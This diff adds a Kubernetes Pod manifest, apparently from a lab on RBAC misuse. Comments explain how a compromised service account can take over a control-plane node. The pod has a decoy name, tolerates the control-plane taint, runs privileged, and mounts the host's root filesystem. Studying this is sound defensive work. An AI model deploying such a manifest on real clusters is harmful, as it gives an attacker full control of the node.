@@ -1,0 +1,32 @@
+# The "malicious manifest". If the compromised SA can create pods,
+# the attacker doesn't need to steal anything else — they can install
+# a privileged pod on the control-plane node and mount its whole disk.
+#
+# Every field here is legal, everyday Kubernetes. That's the point:
+# nothing about this manifest is "hacking" — it's only the RBAC grant
+# in 02-rbac.yaml that makes it an attack.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: backup-tool            # innocent-looking name
+  namespace: default
+spec:
+  nodeSelector:                # land on the control-plane...
+    node-role.kubernetes.io/control-plane: ""
+  tolerations:                 # ...despite its taint
+    - key: node-role.kubernetes.io/control-plane
+      operator: Exists
+      effect: NoSchedule
+  containers:
+    - name: tool
+      image: busybox:1.36
+      command: ["sleep", "infinity"]
+      securityContext:
+        privileged: true       # <-- god mode inside the node
+      volumeMounts:
+        - name: host
+          mountPath: /host     # <-- the node's entire filesystem
+  volumes:
+    - name: host
+      hostPath:
+        path: /
